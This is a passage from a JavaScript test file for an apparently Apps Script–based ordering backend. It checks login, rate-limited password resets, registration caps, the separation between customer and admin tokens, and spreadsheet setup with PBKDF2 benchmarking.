  assert.equal(env.post({ action: 'login', email: 'omar@example.ma', password: 'Nouveau-Depart-7' }).ok, true);
});

test('accounts: reset requests are rate-limited and respect the MailApp quota', () => {
  const env = env0();
  signup(env, { email: 'lina@example.ma' });
  for (let i = 0; i < 5; i++) assert.equal(env.post({ action: 'reset_request', email: 'lina@example.ma' }).ok, true);
  assert.equal(env.mails.length, 3);                                        // 3 per e-mail per hour
  assert.equal(env.post({ action: 'reset_request', email: 'nope' }).field, 'email');
  const env2 = env0({ mailQuota: 0 });
  signup(env2, { email: 'lina@example.ma' });
  assert.equal(env2.post({ action: 'reset_request', email: 'lina@example.ma' }).error, 'mail_unavailable');
});

test('accounts: registrations are capped per hour; account actions never reach the admin API', () => {
  const env = env0();
  for (let i = 0; i < 30; i++) assert.equal(signup(env).ok, true);
  assert.equal(signup(env).error, 'busy');
  const r = env.post({ action: 'login', email: `salma${acctSeq - 1}@example.ma`, password: PW });
  assert.equal(r.ok, true);
  assert.equal(env.post({ action: 'list', key: r.session }).error, 'bad_key');   // a customer token is not an admin token
  assert.equal(env.post({ action: 'me', key: KEY }).error, 'auth');
});

test('setup() also creates the Clients tab and the account column', () => {
  const env = makeEnv();
  env.run('setup');
  assert.equal(env.sheets.Clients.rows[0][0], 'ID client');
  assert.equal(env.sheets.Commandes.rows[0][14], 'Compte client');
  env.run('benchmarkHash');
  assert.ok(env.logs.some((l) => /itérations PBKDF2/.test(l)));
});
